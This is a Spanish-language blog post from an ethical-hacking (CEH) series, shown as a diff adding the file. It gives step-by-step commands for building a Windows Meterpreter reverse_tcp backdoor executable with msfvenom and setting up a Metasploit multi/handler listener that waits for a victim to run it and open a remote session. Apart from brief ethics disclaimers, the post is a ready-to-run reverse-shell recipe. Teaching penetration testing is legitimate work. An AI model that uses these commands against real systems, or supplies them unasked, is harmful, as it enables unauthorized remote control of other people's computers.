@@ -1,0 +1,144 @@
+---
+copyrightnotice: 2024
+copyrightext: All rights reserved
+title: Ejecutando payloads en ethical hacking
+abstract: Este abstract será actualizado una vez que se complete el contenido final
+  del artículo.
+keywords:
+- keyword1
+- keyword2
+categories:
+- Operating System
+tags:
+- ciberseguridad
+- ethical_hacking
+author-note:
+  status-changes:
+    affiliation-change: null
+    deceased: null
+  disclosures:
+    study-registration: null
+    data-sharing: null
+    related-report: null
+    conflict-of-interest: El autor no tiene conflictos de interés que revelar.
+    financial-support: null
+    gratitude: null
+    authorship-agreements: null
+description: Técnicas y precauciones para crear, entregar y ejecutar payloads en pruebas
+  de penetración dentro del marco ético del hacking certificado CEH.
+eval: false
+citation:
+  type: article-journal
+  author:
+  - Edison Achalma
+  pdf-url: https://chaska-x.netlify.app/ciberseguridad-ethical-hacking-ceh/2024-09-03-ejecutando-payload/index.pdf
+date: 09/03/2024
+draft: false
+image: ../featured.jpg
+---
+
+# Creando y Ejecutando un Payload Malicioso con Metasploit: Una Guía Paso a Paso
+
+Hola a todos! Hoy vamos a sumergirnos en el fascinante mundo de la seguridad informática y la creación de un payload malicioso usando Metasploit. Si bien esta guía es con fines educativos, es crucial recordar que utilizar estas herramientas para actividades maliciosas es ilegal y antiético. ¡Usémoslas para aprender y proteger!
+
+# Paso 1: Obtener la Dirección IP con ifconfig
+
+Primero, necesitamos conocer nuestra dirección IP local para configurar el payload. Usamos el comando `ifconfig` para obtener esta información. Abre tu terminal y escribe:
+
+```sh
+ifconfig
+```
+
+Esto mostrará todas las interfaces de red y sus respectivas direcciones IP. Busca la IP de tu red local. En este ejemplo, supongamos que es `192.168.122.152`.
+
+# Paso 2: Crear el Payload con msfvenom
+
+Ahora que tenemos nuestra dirección IP, vamos a crear el payload. Usaremos `msfvenom`, una herramienta que viene con Metasploit para generar payloads maliciosos. Queremos crear un payload que permita un acceso remoto a una máquina con Windows. Usamos el siguiente comando:
+
+```sh
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.122.152 LPORT=4444 -f exe -o backdoor.exe -a x64
+```
+
+Desglosamos el comando:
+
+- `-p windows/x64/meterpreter/reverse_tcp`: Especificamos el payload, que en este caso es un Meterpreter reverse TCP para Windows de 64 bits.
+- `LHOST=192.168.122.152`: Establecemos nuestra dirección IP local como el host de escucha.
+- `LPORT=4444`: Elegimos el puerto de escucha (puedes cambiarlo si es necesario).
+- `-f exe`: Indicamos que el formato de salida debe ser un archivo ejecutable de Windows.
+- `-o backdoor.exe`: Nombramos el archivo de salida `backdoor.exe`.
+- `-a x64`: Especificamos la arquitectura del payload (64 bits).
+
+# Paso 3: Configurar el Handler en Metasploit
+
+Una vez que tenemos nuestro payload, necesitamos configurar un handler en Metasploit para escuchar las conexiones entrantes. Iniciamos Metasploit con:
+
+```sh
+msfconsole -q
+```
+
+La opción `-q` es para iniciar Metasploit en modo silencioso.
+
+# Paso 4: Configurar el Exploit Handler
+
+En la consola de Metasploit, seguimos estos pasos:
+
+1. **Seleccionar el handler**:
+
+   ```sh
+   msf6 > use exploit/multi/handler
+   ```
+
+   Esto indica que usaremos el módulo handler para gestionar la conexión entrante.
+
+2. **Configurar el payload**:
+
+   ```sh
+   msf6 > set payload windows/x64/meterpreter/reverse_tcp
+   ```
+
+3. **Establecer el LHOST y LPORT**:
+
+   ```sh
+   msf6 > set lhost 192.168.122.152
+   msf6 > set lport 4444
+   ```
+
+4. **Verificar las opciones**:
+
+   ```sh
+   msf6 > show options
+   ```
+
+   Esto muestra todas las opciones configuradas para asegurar que todo esté correcto.
+
+# Paso 5: Ejecutar el Handler
+
+Finalmente, ejecutamos el handler para empezar a escuchar conexiones:
+
+```sh
+msf6 > run
+```
+
+Ahora, el handler está activo y esperando que alguien ejecute el `backdoor.exe` en su máquina. Cuando esto suceda, obtendrás una sesión de Meterpreter y podrás interactuar con la máquina comprometida.
+
+# Conclusión
+
+Este proceso demuestra cómo se puede crear y manejar un payload malicioso usando Metasploit. Nuevamente, subrayo la importancia de utilizar este conocimiento de manera ética y legal, principalmente para probar y fortalecer la seguridad de sistemas. Siempre asegúrate de tener permiso para realizar estas pruebas.
+
+Espero que hayas encontrado esta guía informativa y útil. ¡Hasta la próxima!
+
+
+
+
+
+
+# Publicaciones Similares
+
+Si te interesó este artículo, te recomendamos que explores otros blogs y recursos relacionados que pueden ampliar tus conocimientos. Aquí te dejo algunas sugerencias:
+
+
+1. [{{< fa regular file-pdf >}}](https://chaska-x.netlify.app/ciberseguridad-ethical-hacking-ceh/2024-09-03-ejecutando-payload/index.pdf) [Ejecutando Payload](https://chaska-x.netlify.app/ciberseguridad-ethical-hacking-ceh/2024-09-03-ejecutando-payload)
+
+
+Esperamos que encuentres estas publicaciones igualmente interesantes y útiles. ¡Disfruta de la lectura!
+
